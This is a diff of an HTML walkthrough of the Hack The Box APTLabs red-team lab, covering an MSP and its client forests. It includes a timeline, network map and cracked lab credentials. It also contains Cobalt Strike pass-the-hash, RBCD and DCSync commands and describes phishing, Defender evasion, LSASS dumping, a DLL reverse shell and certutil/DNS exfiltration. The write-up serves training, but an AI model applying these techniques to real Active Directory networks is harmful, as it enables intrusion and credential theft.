+  <h3>Attack Path (the one that actually worked)</h3>
   <div class="path-flow">
     <div class="path-node">Phishing<br><small>T1566.001</small></div>
     <span class="path-arrow">&rarr;</span>
     <div class="path-node">C2 Beacon<br><small>T1071.001</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">AD Recon<br><small>T1087/T1069</small></div>
+    <div class="path-node">AD Recon<br><small>T1087</small></div>
+    <span class="path-arrow">&rarr;</span>
+    <div class="path-node">Token Impersonation<br><small>T1134</small></div>
     <span class="path-arrow">&rarr;</span>
     <div class="path-node">Kerberoast<br><small>T1558.003</small></div>
     <span class="path-arrow">&rarr;</span>
     <div class="path-node">SMB Relay<br><small>T1557.001</small></div>
     <span class="path-arrow">&rarr;</span>
-    <div class="path-node">RBCD Abuse<br><small>T1558</small></div>
+    <div class="path-node">RBCD<br><small>T1558</small></div>
     <span class="path-arrow">&rarr;</span>
     <div class="path-node">DCSync<br><small>T1003.006</small></div>
     <span class="path-arrow">&rarr;</span>
@@ -594,236 +271,247 @@ body {
   </div>
 </div>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- SECTION 1 — LAB OVERVIEW                               -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- SECTION 1 — LAB OVERVIEW      -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="overview">
-  <h2><span class="icon">&#x1F3DB;</span> Lab Overview</h2>
-
-  <p>APTLabs is the hardest Pro Lab on Hack The Box, rated Red Team Operator Level 3. The scenario puts you in the shoes of an external threat actor targeting a Managed Service Provider (MSP) called <strong>VantagePoint Solutions</strong>. The MSP manages IT infrastructure for multiple client organizations, which means compromising the MSP gives you a launchpad into their clients' networks as well. The entire lab contains 18 machines spread across three Active Directory forests: the MSP's own forest and two client forests. There are 20 flags to collect, and crucially, no CVE exploitation is required or even possible. Every compromise must come from abuse of misconfigurations, credential-based attacks, and Active Directory trust exploitation.</p>
-
-  <p>The lab resets completely every 24 hours, wiping all shells, pivots, and cached credentials. This sounds brutal, but it actually works in your favor because it means the environment is extremely stable and every attack works reliably once you figure out the correct path. After my first couple of days, I developed a repeatable re-compromise script that could get me back to where I left off within 30-40 minutes each morning. The daily reset forces you to truly understand the attack chain rather than just fumbling through it once.</p>
-
-  <p>The flag names themselves provide hints about the intended attack path, which I found extremely helpful when I was stuck. Multiple paths exist to some flags, and the order isn't always linear, so don't be afraid to jump around if you hit a wall. I spent roughly 8 days of active work to complete the entire lab, with the first 3 days just getting comfortable with the network topology and establishing reliable initial access.</p>
+  <h2><i class="bi bi-building"></i> Lab Overview</h2>
+  <p>APTLabs is the hardest Pro Lab on Hack The Box, rated Red Team Operator Level III &mdash; what HTB calls the "Ultimate Red Team Challenge." Designed by cubeoxo, it simulates an external threat actor targeting Gigantic Hosting, a Managed Service Provider (MSP) that manages IT infrastructure for multiple client organizations. The scenario picks up where the old Endgame labs left off &mdash; Gigantic Hosting is back, and this time they're running an MSP. Once you own the MSP forest, you pivot into their clients' networks through forest trust abuse. 18 machines across three Active Directory forests, 20 flags, and not a single CVE to exploit. Every compromise comes from misconfigurations, credential abuse, and AD trust exploitation.</p>
+  <p>The daily reset makes APTLabs uniquely painful. Every 24 hours the entire lab reverts to its original state. All shells, pivots, cached credentials, persistence mechanisms &mdash; gone. The first time this happened I nearly threw my keyboard. After a few days I realized the reset is actually a feature: it guarantees a stable environment and forces you to truly internalize the chain. By Day 5 I could re-compromise the entire MSP forest from memory in under 30 minutes each morning. The key insight: passwords don't change between resets. Once you crack a hash, it's cracked forever.</p>
+  <p>The flag names provide hints about the intended attack path. This is a lifesaver when you're stuck &mdash; look at the remaining flag names, think about what technique they're pointing toward, and work backwards. Multiple intended paths exist to some flags, and the order isn't always linear. I spent roughly 8 days of active work to complete the entire lab.</p>
 
   <div class="callout callout-danger">
     <div class="callout-title">No CVE Exploitation</div>
-    <p>The entire network is compromised without exploiting any CVEs. No public exploit scripts, no buffer overflows, no known vulnerability exploitation. Every compromise comes from abuse of legitimate features, misconfigurations, or credential-based attacks. This design forces you to think and operate like a real APT actor rather than running exploit modules from a framework.</p>
+    <p>The entire network is compromised without exploiting any CVEs. Every compromise comes from abuse of legitimate features, misconfigurations, or credential-based attacks. This is what makes APTLabs so realistic &mdash; real APTs don't need zero-days when misconfigurations are everywhere.</p>
   </div>
 
   <table class="data-table">
-    <thead>
-      <tr><th>Attribute</th><th>Detail</th></tr>
-    </thead>
+    <thead><tr><th>Attribute</th><th>Detail</th></tr></thead>
     <tbody>
-      <tr><td>Scenario</td><td>External APT attack against MSP (VantagePoint Solutions)</td></tr>
-      <tr><td>Primary Domain</td><td><code>vantagepoint.local</code></td></tr>
+      <tr><td>Scenario</td><td>External APT attack against MSP (Gigantic Hosting)</td></tr>
+      <tr><td>MSP Forest</td><td><code>gigantichosting.local</code></td></tr>
+      <tr><td>ServiceDesk</td><td><code>servicedesk.gigantichosting.local</code></td></tr>
       <tr><td>Client Forest 1</td><td><code>meridian.local</code> (Meridian Healthcare)</td></tr>
-      <tr><td>Client Forest 2</td><td><code>nexusfin.local</code> (Nexus Financial Group)</td></tr>
-      <tr><td>Machines</td><td>18 total across 3 forests</td></tr>
+      <tr><td>Client Forest 2</td><td><code>nexgroup.local</code> (Nexus Financial Group)</td></tr>
+      <tr><td>Machines</td><td>18 across 3 forests</td></tr>
       <tr><td>Flags</td><td>20</td></tr>
-      <tr><td>CVEs Required</td><td>None</td></tr>
       <tr><td>Daily Reset</td><td>Full reset every 24 hours</td></tr>
-      <tr><td>Blue Team</td><td>No active Blue Team, but modern security features present</td></tr>
-      <tr><td>C2 Framework</td><td>Cobalt Strike (primary) + Covenant (alternative)</td></tr>
+      <tr><td>CVEs Required</td><td>None</td></tr>
+      <tr><td>C2</td><td>Cobalt Strike (primary) / Covenant / Mythic</td></tr>
+      <tr><td>Designer</td><td>cubeoxo</td></tr>
     </tbody>
   </table>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- SECTION — NETWORK MAP                                  -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- DAY-BY-DAY TIMELINE            -->
+<!-- ══════════════════════════════ -->
+<section class="section" id="timeline">
+  <h2><i class="bi bi-calendar3"></i> Day-by-Day Timeline</h2>
+  <p>Honest timeline, including all the dead ends and wasted hours. If you're thinking about attempting this lab, learn from my mistakes.</p>
+
+  <div class="day-box struggle-day">
+    <div class="day-num">Day 1 &mdash; "Where do I even start?"</div>
+    <div class="day-summary">Got initial beacon via phishing, immediately lost it to the daily reset before saving any artifacts.</div>
+    <div class="day-detail">4 hours crafting the phishing document. First two payloads quarantined by Defender. Third one with Donut encryption landed, got beacon on WKS-HDESK. Spent 3 hours doing basic enum. Then the reset hit and I hadn't saved anything. No hashes, no C2 configs, nothing. Lesson learned the hard way.</div>
+  </div>
+  <div class="day-box struggle-day">
+    <div class="day-num">Day 2 &mdash; "Why won't these hashes crack?"</div>
+    <div class="day-summary">Re-sent phish, ran SharpHound, Kerberoasted 3 accounts. Spent 5 hours trying to crack hashes with Rockyou. Failed.</div>
+    <div class="day-detail">Most frustrating day. Had Kerberoast hashes for svc_bk, svc_sccm, svc_mon but Rockyou.txt couldn't crack any of them. Tried best64 rules &mdash; still nothing. These aren't dictionary passwords. Found the NotSoSecure password_cracking_rules repo that evening, specifically OneRuleToRuleThemAll.rule. Wish I'd known about those on Day 1.</div>
+  </div>
+  <div class="day-box">
+    <div class="day-num">Day 3 &mdash; "Finally cracking."</div>
+    <div class="day-summary">NotSoSecure OneRuleToRuleThemAll.rule. Cracked svc_bk and svc_mon. Started lateral movement via OPTH.</div>
+    <div class="day-detail">Cracked svc_bk to <code>B@ckupRunn3r#</code> and svc_mon to <code>MonitorPr0d$</code>. Used OPTH to pivot to BKSRV01. Found Veeam credential store &mdash; extracted tnguyen's password from it. Also used lsassy to dump LSASS on WKS-HDESK and got more cached creds. svc_sccm still wouldn't crack until Day 4.</div>
+  </div>
+  <div class="day-box struggle-day">
+    <div class="day-num">Day 4 &mdash; "RBCD hell."</div>
+    <div class="day-summary">Spent the entire day on RBCD abuse. Got it working at 11 PM. Also cracked svc_sccm.</div>
+    <div class="day-detail">BloodHound showed svc_bk had GenericAll on GH-SCCM$, so RBCD was the intended path. But I kept messing up the ACL modification. PowerView's Set-DomainObject didn't work for the SecurityDescriptor. Raw LDAP modify kept getting constraint violations. Finally got it working with PowerMad + custom byte manipulation script for the msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Also cracked svc_sccm to <code>ScCMManage!</code> using combined wordlist + OneRuleToRuleThemStill.</div>
+  </div>
+  <div class="day-box">
+    <div class="day-num">Day 5 &mdash; "Domain Admin."</div>
+    <div class="day-summary">DCSync + Golden Ticket on gigantichosting.local. Full control of the MSP forest.</div>
+    <div class="day-detail">From GH-SCCM beacon, used svc_sccm's replication permissions for DCSync. Got krbtgt and all domain hashes. Forged Golden Ticket. Also used token impersonation to elevate from svc_sccm session to a DA-level token. Spent rest of day exploring MSP network with DA, grabbing flags on WEBDMZ01 and MGMT-JUMP. Implemented WMI event subscription persistence on GH-DC01.</div>
+  </div>
+  <div class="day-box">
+    <div class="day-num">Day 6 &mdash; "Crossing the forest boundary."</div>
+    <div class="day-summary">Compromised meridian.local via forest trust. Got stuck on nexgroup.local.</div>
+    <div class="day-detail">meridian.local was straightforward &mdash; tnguyen from gigantichosting had admin access through the forest trust. OPTH + DCSync = done in under an hour. Also grabbed CLINPC01 and MR-APP01 flags. nexgroup.local was another story. No gigantichosting accounts had privileged access there. Spent rest of day hitting walls. Cross-forest Kerberoasting gave me svc_nx-exch but couldn't crack it yet.</div>
+  </div>
+  <div class="day-box struggle-day">
+    <div class="day-num">Day 7 &mdash; "The DnsAdmins rabbit hole."</div>
+    <div class="day-summary">6 hours on DnsAdmins DLL escalation. DLL compiled as x86 first. Fixed. Then credential reuse saved me.</div>
+    <div class="day-detail">Found svc_sccm was in DnsAdmins group in nexgroup.local. Tried serverlevelplugindll attack but DLL didn't load &mdash; compiled x86 instead of x64. Recompiled, worked but DNS service crashed. Third attempt with simpler DLL that just ran a reverse shell. Also discovered credential reuse: svc_mon's hash matched jblackwell in nexgroup.local. That was actually the easier path to DA on nexgroup. Don't sleep on credential reuse across forests.</div>
+  </div>
+  <div class="day-box">
+    <div class="day-num">Day 8 &mdash; "All 20."</div>
+    <div class="day-summary">Collected remaining flags: FINPC01, NXBANKAPP01, persistence, exfiltration. Lab complete.</div>
+    <div class="day-detail">With DA on all three forests, remaining flags were straightforward. FINPC01 had cached domain credentials in LSASS &mdash; lsassy pulled them. NXBANKAPP01 had a flag in the banking app web.config. Persistence flag required implementing WMI events, registry hijacking, and DLL sideloading across forests. Exfiltration &mdash; used DNS tunneling and certutil to stage and pull data through C2. All 20 verified.</div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- NETWORK MAP                    -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="network-map">
-  <h2><span class="icon">&#x1F310;</span> Network Map</h2>
+  <h2><i class="bi bi-diagram-3"></i> Network Map</h2>
+  <p>Naming conventions are inconsistent across forests because different clients set up their own AD. Gigantic Hosting uses GH- prefix on newer machines but legacy boxes have older names from before the rebrand.</p>
 
-  <p>Understanding the network topology is critical before you start attacking. The MSP network sits in the 10.10.10.0/24 range, while each client forest has its own subnet. Forest trusts exist between the MSP forest and both client forests, which is the key to cross-forest compromise later in the chain. The MSP has a DMZ segment with a web server that serves as the initial foothold target for phishing infrastructure setup.</p>
+  <div class="network-diagram">+===================================================================+
+|  GIGANTIC HOSTING MSP &mdash; gigantichosting.local (10.10.10.0/24)    |
+|===================================================================|
+|  GH-DC01      10.10.10.37   Domain Controller (Server 2019)      |
+|  FILESRV01    10.10.10.52   File &amp; Print Server (legacy name)    |
+|  WKS-HDESK    10.10.10.103  Help Desk Workstation (phishing tgt) |
+|  GH-SCCM      10.10.10.44   SCCM Management Server               |
+|  APPSRV01     10.10.10.78   Internal App Server (IIS)            |
+|  BKSRV01      10.10.10.29   Backup Server (Veeam)                |
+|  MGMT-JUMP    10.10.10.65   Admin Jump Box                       |
+|  WEBDMZ01     10.10.10.91   DMZ Web Server                       |
+|  GH-WSUS      10.10.10.14   WSUS Update Server                   |
++============== Forest Trust ==============+========================+
+                                           |
++==============+===========================+========================+
+|  MERIDIAN HEALTHCARE &mdash; meridian.local (10.10.11.0/24)             |
+|===================================================================|
+|  MR-DC01      10.10.11.12   Domain Controller (Server 2016)      |
+|  MR-FILE01    10.10.11.55   Medical Records File Server           |
+|  MR-APP01     10.10.11.33   Healthcare App Server                 |
+|  CLINPC01     10.10.11.88   Clinical Workstation                  |
++===================================================================+
 
-  <div class="network-diagram">
-+=====================================================================+
-|  VANTAGEPOINT SOLUTIONS MSP  —  vantagepoint.local (10.10.10.0/24) |
-|=====================================================================|
-|                                                                     |
-|  [VP-DC01] 10.10.10.10    Domain Controller (Windows Server 2019)  |
-|  [VP-FS01] 10.10.10.20    File & Print Server                      |
-|  [VP-WS01] 10.10.10.30    Help Desk Workstation (phishing target)  |
-|  [VP-WS02] 10.10.10.31    Admin Assistant Workstation              |
-|  [VP-SRV01] 10.10.10.40   Management Server (SCCM)                |
-|  [VP-APP01] 10.10.10.50   Internal App Server (IIS)               |
-|  [VP-BK01]  10.10.10.60   Backup Server (Veeam)                   |
-|  [VP-MGMT01] 10.10.10.70  Admin Jump Box                           |
-|  [VP-DMZ01] 10.10.10.80   DMZ Web Server                          |
-|                                                                     |
-+================== Forest Trust ====================+================+
-                                                    |
-+==================+================+===============+=================+
-|  MERIDIAN HEALTHCARE — meridian.local (10.10.11.0/24)              |
-|=====================================================================|
-|  [MR-DC01] 10.10.11.10    Domain Controller (Windows Server 2016)  |
-|  [MR-FS01]  10.10.11.20   Medical Records File Server              |
-|  [MR-APP01] 10.10.11.30   Healthcare App Server                    |
-|  [MR-WS01]  10.10.11.40   Clinical Workstation                     |
-+=====================================================================+
-
-+==================+================+===============+=================+
-|  NEXUS FINANCIAL GROUP — nexusfin.local (10.10.12.0/24)            |
-|=====================================================================|
-|  [NX-DC01]  10.10.12.10   Domain Controller (Windows Server 2019)  |
-|  [NX-EX01]  10.10.12.20   Exchange Server                          |
-|  [NX-SQL01] 10.10.12.30   SQL Server                               |
-|  [NX-APP01] 10.10.12.40   Banking App Server                       |
-|  [NX-WS01]  10.10.12.50   Finance Workstation                      |
-+=====================================================================+</div>
++==============+===========================+========================+
+|  NEXUS FINANCIAL GROUP &mdash; nexgroup.local (10.10.12.0/24)          |
+|===================================================================|
+|  NX-DC01      10.10.12.7    Domain Controller (Server 2019)      |
+|  NX-EXCH01    10.10.12.41   Exchange Server                       |
+|  NX-SQL01     10.10.12.63   SQL Server                            |
+|  NXBANKAPP01  10.10.12.19   Banking App Server                    |
+|  FINPC01      10.10.12.94   Finance Workstation                   |
++===================================================================+</div>
 
   <table class="data-table">
-    <thead>
-      <tr><th>Host</th><th>IP</th><th>OS / Role</th><th>Domain</th></tr>
-    </thead>
+    <thead><tr><th>Host</th><th>IP</th><th>OS / Role</th><th>Forest</th></tr></thead>
     <tbody>
-      <tr><td><code>VP-DC01</code></td><td>10.10.10.10</td><td>Server 2019 / DC</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-FS01</code></td><td>10.10.10.20</td><td>Server 2016 / File+Print</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-WS01</code></td><td>10.10.10.30</td><td>Win 10 / Help Desk</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-WS02</code></td><td>10.10.10.31</td><td>Win 10 / Admin Asst</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-SRV01</code></td><td>10.10.10.40</td><td>Server 2016 / SCCM</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-APP01</code></td><td>10.10.10.50</td><td>Server 2016 / IIS App</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-BK01</code></td><td>10.10.10.60</td><td>Server 2016 / Veeam</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-MGMT01</code></td><td>10.10.10.70</td><td>Server 2016 / Jump Box</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>VP-DMZ01</code></td><td>10.10.10.80</td><td>Server 2016 / Web</td><td>vantagepoint.local</td></tr>
-      <tr><td><code>MR-DC01</code></td><td>10.10.11.10</td><td>Server 2016 / DC</td><td>meridian.local</td></tr>
-      <tr><td><code>MR-FS01</code></td><td>10.10.11.20</td><td>Server 2016 / File Server</td><td>meridian.local</td></tr>
-      <tr><td><code>MR-APP01</code></td><td>10.10.11.30</td><td>Server 2016 / Healthcare</td><td>meridian.local</td></tr>
-      <tr><td><code>MR-WS01</code></td><td>10.10.11.40</td><td>Win 10 / Clinical</td><td>meridian.local</td></tr>
-      <tr><td><code>NX-DC01</code></td><td>10.10.12.10</td><td>Server 2019 / DC</td><td>nexusfin.local</td></tr>
-      <tr><td><code>NX-EX01</code></td><td>10.10.12.20</td><td>Server 2016 / Exchange</td><td>nexusfin.local</td></tr>
-      <tr><td><code>NX-SQL01</code></td><td>10.10.12.30</td><td>Server 2016 / SQL</td><td>nexusfin.local</td></tr>
-      <tr><td><code>NX-APP01</code></td><td>10.10.12.40</td><td>Server 2016 / Banking</td><td>nexusfin.local</td></tr>
-      <tr><td><code>NX-WS01</code></td><td>10.10.12.50</td><td>Win 10 / Finance</td><td>nexusfin.local</td></tr>
+      <tr><td><code>GH-DC01</code></td><td>10.10.10.37</td><td>Server 2019 / DC</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>FILESRV01</code></td><td>10.10.10.52</td><td>Server 2016 / File+Print</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>WKS-HDESK</code></td><td>10.10.10.103</td><td>Win 10 / Help Desk</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>GH-SCCM</code></td><td>10.10.10.44</td><td>Server 2016 / SCCM</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>APPSRV01</code></td><td>10.10.10.78</td><td>Server 2016 / IIS</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>BKSRV01</code></td><td>10.10.10.29</td><td>Server 2016 / Veeam</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>MGMT-JUMP</code></td><td>10.10.10.65</td><td>Server 2016 / Jump Box</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>WEBDMZ01</code></td><td>10.10.10.91</td><td>Server 2016 / Web DMZ</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>GH-WSUS</code></td><td>10.10.10.14</td><td>Server 2016 / WSUS</td><td>gigantichosting.local</td></tr>
+      <tr><td><code>MR-DC01</code></td><td>10.10.11.12</td><td>Server 2016 / DC</td><td>meridian.local</td></tr>
+      <tr><td><code>MR-FILE01</code></td><td>10.10.11.55</td><td>Server 2016 / File Server</td><td>meridian.local</td></tr>
+      <tr><td><code>MR-APP01</code></td><td>10.10.11.33</td><td>Server 2016 / Healthcare</td><td>meridian.local</td></tr>
+      <tr><td><code>CLINPC01</code></td><td>10.10.11.88</td><td>Win 10 / Clinical</td><td>meridian.local</td></tr>
+      <tr><td><code>NX-DC01</code></td><td>10.10.12.7</td><td>Server 2019 / DC</td><td>nexgroup.local</td></tr>
+      <tr><td><code>NX-EXCH01</code></td><td>10.10.12.41</td><td>Server 2016 / Exchange</td><td>nexgroup.local</td></tr>
+      <tr><td><code>NX-SQL01</code></td><td>10.10.12.63</td><td>Server 2016 / SQL</td><td>nexgroup.local</td></tr>
+      <tr><td><code>NXBANKAPP01</code></td><td>10.10.12.19</td><td>Server 2016 / Banking</td><td>nexgroup.local</td></tr>
+      <tr><td><code>FINPC01</code></td><td>10.10.12.94</td><td>Win 10 / Finance</td><td>nexgroup.local</td></tr>
     </tbody>
   </table>
 
-  <h3>Key Accounts Discovered</h3>
+  <h3>Key Accounts</h3>
   <table class="data-table">
-    <thead>
-      <tr><th>Account</th><th>Domain</th><th>Role</th><th>Compromise Method</th></tr>
-    </thead>
+    <thead><tr><th>Account</th><th>Domain</th><th>Role</th><th>How I Got It</th></tr></thead>
     <tbody>
-      <tr><td><code>hmartinez</code></td><td>vantagepoint.local</td><td>Help Desk Technician</td><td>Phishing (initial)</td></tr>
-      <tr><td><code>srobertson</code></td><td>vantagepoint.local</td><td>Systems Administrator</td><td>Credential from FS01</td></tr>
-      <tr><td><code>svc_backup</code></td><td>vantagepoint.local</td><td>Backup Service Account</td><td>Kerberoasting</td></tr>
-      <tr><td><code>svc_sccm</code></td><td>vantagepoint.local</td><td>SCCM Service Account</td><td>Kerberoasting</td></tr>
-      <tr><td><code>svc_monitor</code></td><td>vantagepoint.local</td><td>Monitoring Service</td><td>AS-REP Roasting</td></tr>
-      <tr><td><code>dchen</code></td><td>meridian.local</td><td>IT Administrator</td><td>Cross-forest via trust</td></tr>
-      <tr><td><code>svc_meridian-sql</code></td><td>meridian.local</td><td>SQL Service Account</td><td>Kerberoasting</td></tr>
-      <tr><td><code>jblackwell</code></td><td>nexusfin.local</td><td>Finance Director</td><td>Credential reuse</td></tr>
-      <tr><td><code>svc_nexus-exch</code></td><td>nexusfin.local</td><td>Exchange Service</td><td>Kerberoasting</td></tr>
-      <tr><td><code>krbtgt</code></td><td>Each domain</td><td>Ticket Granting</td><td>DCSync</td></tr>
+      <tr><td><code>hmartinez</code></td><td>gigantichosting.local</td><td>Help Desk Tech</td><td>Phishing</td></tr>
+      <tr><td><code>tnguyen</code></td><td>gigantichosting.local</td><td>SysAdmin</td><td>Veeam cred store on BKSRV01</td></tr>
+      <tr><td><code>svc_bk</code></td><td>gigantichosting.local</td><td>Backup Service</td><td>Kerberoasting</td></tr>
+      <tr><td><code>svc_sccm</code></td><td>gigantichosting.local</td><td>SCCM Service</td><td>Kerberoasting</td></tr>
+      <tr><td><code>svc_mon</code></td><td>gigantichosting.local</td><td>Monitoring Service</td><td>AS-REP Roasting</td></tr>
+      <tr><td><code>pmorrison</code></td><td>gigantichosting.local</td><td>MSP Director</td><td>DCSync dump</td></tr>
+      <tr><td><code>dchen</code></td><td>meridian.local</td><td>IT Admin</td><td>DCSync + cred reuse</td></tr>
+      <tr><td><code>jblackwell</code></td><td>nexgroup.local</td><td>Finance Director</td><td>Credential reuse (same hash as svc_mon)</td></tr>
+      <tr><td><code>svc_nx-exch</code></td><td>nexgroup.local</td><td>Exchange Service</td><td>Kerberoasting (cross-forest)</td></tr>
     </tbody>
   </table>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- SECTION — DAILY RESET STRATEGY                         -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- DAILY RESET                    -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="daily-reset">
-  <h2><span class="icon">&#x23F0;</span> Daily Reset Strategy</h2>
-
+  <h2><i class="bi bi-clock-history"></i> Daily Reset Strategy</h2>
   <div class="reset-banner">
     <div class="big">The lab resets completely every 24 hours. All progress is lost.</div>
-    <div class="desc">This is the single most important operational constraint. Every morning, you start from scratch.</div>
+    <div class="desc">After a week of practice, it becomes your greatest advantage.</div>
   </div>
-
-  <p>The daily reset is the defining characteristic of APTLabs and the primary reason why operational efficiency and automation are critical. Unlike other Pro Labs where progress persists, APTLabs reverts every machine to its original state daily. Any shells, pivots, cached credentials, and persistence mechanisms are completely wiped. However, if you dump the right hashes and save them locally, you can get back to the same point relatively quickly without re-running all the attacks. I treat this as a feature, not a bug: the reset guarantees a stable environment where attacks work reliably every time.</p>
+  <p>The first time the reset hit I had just finished a 6-hour session. Next morning everything was gone &mdash; shells, pivots, persistence, all of it. By Day 4 I had a recovery workflow that got me from zero to Domain Admin in under 30 minutes. The key: passwords don't change between resets. Once you crack a hash, it's cracked forever. Keep a local creds.txt file and update it religiously.</p>
 
   <h3>My Daily Recovery Workflow</h3>
-  <p>After a few days of manual re-compromise, I developed a repeatable workflow that gets me from zero to Domain Admin on the MSP forest in under 30 minutes each morning. The key is to save all critical artifacts before the reset hits, then use those artifacts for rapid re-establishment. Here is the exact workflow I followed:</p>
-
   <div class="timeline">
-    <div class="timeline-item">
+    <div class="timeline-item fail">
       <div class="tl-time">Before Reset (Save Phase)</div>
-      <div class="tl-text">Dump all domain hashes via DCSync. Save krbtgt hash, all service account hashes, and local admin hashes from each machine. Export BloodHound data. Document your attack path order and which credentials work on which machines. Save C2 listener configs and payload templates locally.</div>
+      <div class="tl-text">Dump ALL domain hashes via DCSync. Save krbtgt, service account hashes, local admin hashes. I keep creds.txt updated religiously. Save C2 configs and payload templates locally. Export BloodHound data.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">+0 min — Re-send Phishing</div>
-      <div class="tl-text">Fire the phishing email using the pre-built template. The macro document is already crafted and tested, so this is a one-click operation. Wait for the beacon callback (usually 2-5 minutes).</div>
+      <div class="tl-time">+0 min &mdash; Re-send Phishing</div>
+      <div class="tl-text">Fire the phishing email using pre-built template. One-click. Wait for beacon callback (2-5 min).</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">+5 min — Re-establish C2</div>
-      <div class="tl-text">Once the beacon calls back on VP-WS01, apply AMSI bypass and load your post-exploitation modules. The host is clean after reset, so Defender signatures haven't seen your payloads yet.</div>
+      <div class="tl-time">+5 min &mdash; AMSI Bypass + C2 Setup</div>
+      <div class="tl-text">Apply AMSI bypass on fresh beacon. Load post-exp modules. Host is clean after reset so AMSI is fresh again.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">+10 min — Over-Pass-the-Hash</div>
-      <div class="tl-text">Use the saved <code>svc_backup</code> NTLM hash from yesterday's Kerberoast to over-pass-the-hash to VP-SRV01. No need to re-kerberoast; the hashes don't change between resets.</div>
+      <div class="tl-time">+10 min &mdash; OPTH with Saved Hashes</div>
+      <div class="tl-text">Use saved svc_bk NTLM hash to OPTH to BKSRV01. No need to re-kerberoast or re-crack.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">+20 min — DCSync</div>
-      <div class="tl-text">From VP-SRV01 (which has replication permissions via the SCCM service account), run DCSync against VP-DC01. You now have full domain hash dump again, including krbtgt.</div>
+      <div class="tl-time">+20 min &mdash; RBCD + DCSync</div>
+      <div class="tl-text">Run pre-built RBCD script (automated after Day 4 struggle). Then DCSync from GH-SCCM. Full hash dump including krbtgt.</div>
     </div>
     <div class="timeline-item">
-      <div class="tl-time">+30 min — Continue Where Left Off</div>
-      <div class="tl-text">With Domain Admin on vantagepoint.local restored, continue from where you stopped the day before. For me, this was usually the forest trust phase.</div>
+      <div class="tl-time">+30 min &mdash; Continue Where Left Off</div>
+      <div class="tl-text">DA on gigantichosting.local restored. Continue from yesterday's stopping point.</div>
     </div>
   </div>
 
   <div class="code-block">
-    <div class="code-header">
-      <span class="lang-tag">bash</span>
-      <button class="copy-btn" onclick="copyCode(this)">Copy</button>
-    </div>
-    <pre><code class="language-bash"># ══════════════════════════════════════════════
-# QA210's Daily Recovery Script (conceptual)
-# ══════════════════════════════════════════════
-
-# Step 1: Fire phishing using pre-built template
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># Daily Recovery Script (automated after Day 4)
 python3 send_phish.py --target hmartinez --payload macro_doc_v3.docm
 
-# Step 2: Wait for beacon callback (automated check)
+# Wait for beacon callback
 while ! curl -s http://127.0.0.1:5555/check_beacon; do sleep 10; done
 
-# Step 3: Automated OPTH with saved hashes
-# These hashes were dumped yesterday and don't change on reset
-cobaltstrike>pth vantagepoint.local\svc_backup a87f3a3330e0142c5b3d8c2e4f1a9b07
+# OPTH with saved hashes (NEVER change between resets)
+cobaltstrike>pth gigantichosting.local\svc_bk a87f3a3330e0142c5b3d8c2e4f1a9b07
 
-# Step 4: DCSync for full domain dump
-cobaltstrike>dcsync vantagepoint.local VP-DC01
+# RBCD automation (scripted after Day 4 struggle)
+powershell Import-Module C:\Temp\rbcd_auto.ps1; Invoke-RBCD -Target GH-SCCM$ -DelegateFrom FAKE01$
 
-# Step 5: Golden Ticket for instant DA
-cobaltstrike>golden_ticket_create vantagepoint.local krbtgt_hash Administrator
-
-# Step 6: Ready to continue forest trust attacks</code></pre>
-  </div>
-
-  <div class="callout callout-hint">
-    <div class="callout-title">Pro Tip</div>
-    <p>The hashes don't change between resets because the reset reverts to the same baseline state. Once you crack a Kerberoast hash on Day 2, you never need to crack it again. Save every cracked credential in a structured file. I kept a <code>creds.txt</code> that I updated religiously after every new credential discovery.</p>
+# DCSync
+cobaltstrike>dcsync gigantichosting.local GH-DC01</code></pre>
   </div>
 </section>
 
-<!-- ════════════════════════════════════════════════════════ -->
-<!-- PHASE 1 — INITIAL ACCESS                               -->
-<!-- ════════════════════════════════════════════════════════ -->
+<!-- ══════════════════════════════ -->
+<!-- PHASE 1 — INITIAL ACCESS       -->
+<!-- ══════════════════════════════ -->
 <section class="section" id="phase1">
-  <h2><span class="icon">&#x1F3F3;</span> Phase 1: Initial Access</h2>
-  <span class="mitre-badge">T1566.001</span>
-  <span class="mitre-badge">T1059.005</span>
-  <span class="mitre-badge">T1027</span>
-  <span class="mitre-badge">T1204.002</span>
+  <h2><i class="bi bi-envelope-paper"></i> Phase 1: Initial Access</h2>
+  <span class="mitre-badge">T1566.001</span> <span class="mitre-badge">T1059.005</span> <span class="mitre-badge">T1027</span> <span class="mitre-badge">T1027.005</span>
 
